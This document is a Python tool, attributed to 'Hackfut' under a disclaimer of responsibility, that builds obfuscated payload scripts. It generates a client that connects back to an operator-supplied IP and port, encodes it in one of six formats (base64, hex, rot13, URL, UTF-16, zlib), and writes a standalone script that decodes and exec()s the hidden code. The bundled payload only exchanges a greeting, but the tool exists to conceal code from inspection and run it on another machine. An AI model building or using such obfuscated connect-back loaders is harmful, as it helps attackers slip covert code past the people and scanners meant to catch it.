import base64
import binascii
import codecs
import urllib.parse
import zlib
import os
import sys
import time

os.system('cls')
os.system('clear')
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

banner = {'''
          
          #Author  : Hackfut
          #Contact : t.me/HackfutSec
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]

           __________.__  .__  __         _________            .___                   
           \______   \  | |__|/  |________\_   ___ \  ____   __| _/___________  ______
            |    |  _/  | |  \   __\___   /    \  \/ /  _ \ / __ |/ __ \_  __ \/  ___/
            |    |   \  |_|  ||  |  /    /\     \___(  <_> ) /_/ \  ___/|  | \/\___ \ 
            |______  /____/__||__| /_____ \\______  /\____/\____ |\___  >__|  /____  >
                   \/                    \/       \/            \/    \/           \/ 
                               

'''}

for col in banner:
    print(bcolors.GREEN + col, end="")
    sys.stdout.flush()
    time.sleep(0.00005)


# Function to generate the payload
def generate_payload(ip, port):
    payload = f"""
import socket

def connect_to_remote(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(f"Connected to {{ip}}:{{port}}")
        
        message = "Hello from client!"
        s.sendall(message.encode('utf-8'))
        
        data = s.recv(1024)
        print("Received data:", data.decode())
        
        s.close()
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == "__main__":
    connect_to_remote('{ip}', {port})
"""
    return payload

# Function to encode the payload
def encode_payload(payload, encoding_format):
    if encoding_format == 'base64':
        return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    elif encoding_format == 'hex':
        return binascii.hexlify(payload.encode('utf-8')).decode('utf-8')
    elif encoding_format == 'rot13':
        return codecs.encode(payload, 'rot_13')
    elif encoding_format == 'url':
        return urllib.parse.quote(payload)
    elif encoding_format == 'utf-16':
        return payload.encode('utf-16').decode('latin-1')
    elif encoding_format == 'zlib':
        return zlib.compress(payload.encode('utf-8')).hex()
    else:
        raise ValueError("Unrecognized encoding format.")

# Function to create the Python script with the encoded code
def create_script(encoded_payload, encoding_format, output_filename):
    script_content = f"""
import base64
import binascii
import codecs
import urllib.parse
import zlib

def decode_payload(encoded_payload, encoding_format):
    if encoding_format == 'base64':
        return base64.b64decode(encoded_payload).decode('utf-8')
    elif encoding_format == 'hex':
        return binascii.unhexlify(encoded_payload).decode('utf-8')
    elif encoding_format == 'rot13':
        return codecs.decode(encoded_payload, 'rot_13')
    elif encoding_format == 'url':
        return urllib.parse.unquote(encoded_payload)
    elif encoding_format == 'utf-16':
        return encoded_payload.encode('latin-1').decode('utf-16')
    elif encoding_format == 'zlib':
        return zlib.decompress(bytes.fromhex(encoded_payload)).decode('utf-8')
    else:
        raise ValueError("Unrecognized encoding format.")

if __name__ == "__main__":
    encoded_payload = '{encoded_payload}'
    encoding_format = '{encoding_format}'
    
    # Decode and execute the payload
    exec(decode_payload(encoded_payload, encoding_format))
"""

    # Save the script to a file
    with open(output_filename, 'w') as file:
        file.write(script_content)

# Main function
def main():
    # Get user input
    user_ip = input(bcolors.YELLOW + "[CDX] Enter your IP: ")
    user_port = input(bcolors.YELLOW + "[CDX] Enter your port: ")
    output_filename = input(bcolors.YELLOW + "\n[CDX] Enter the output filename (without extension): ")
    
    # Display encoding options
    print(bcolors.RED + "\n[CDX] Choose the encoding format:")
    print("1. base64")
    print("2. hex")
    print("3. rot13")
    print("4. url")
    print("5. utf-16")
    print("6. zlib")
    
    encoding_choice = input(bcolors.YELLOW + "\n[CDX] Enter the number of the encoding format: ")
    
    # Map the choice to a format
    encoding_map = {
        '1': 'base64',
        '2': 'hex',
        '3': 'rot13',
        '4': 'url',
        '5': 'utf-16',
        '6': 'zlib'
    }
    
    encoding_format = encoding_map.get(encoding_choice)
    
    if not encoding_format:
        print(bcolors.RED + "\n[CDX] Invalid choice.")
        return
    
    # Generate the payload
    payload = generate_payload(user_ip, user_port)
    
    # Encode the payload
    encoded_payload = encode_payload(payload, encoding_format)
    
    # Determine the output filename
    output_filename += '.py'  # Add the .py extension for the Python script

    # Create the Python script with the encoded code
    create_script(encoded_payload, encoding_format, output_filename)

    # Display the full path of the saved file
    full_path = os.path.abspath(output_filename)
    print(bcolors.RED + f"\n[CDX] The script has been saved at: '{full_path}'.")
if __name__=="__main__":
    main()